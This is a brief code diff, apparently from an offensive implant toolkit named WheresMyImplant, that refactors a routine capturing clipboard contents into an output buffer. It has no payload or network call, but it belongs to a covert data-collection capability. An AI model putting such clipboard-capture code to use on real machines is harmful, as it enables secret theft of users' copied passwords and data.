@@ -141,11 +141,9 @@ namespace WheresMyImplant
             StringBuilder output = new StringBuilder();
             try
             {
-                using (Clipboard clippy = new Clipboard())
-                {
-                    clippy.Monitor();
-                    output.Append(clippy.GetOutput());
-                }
+                ClipboardManaged clipboard = new ClipboardManaged();
+                clipboard.Execute();
+                output.Append(clipboard.GetOutput());
             }
             catch (Exception ex)
             {
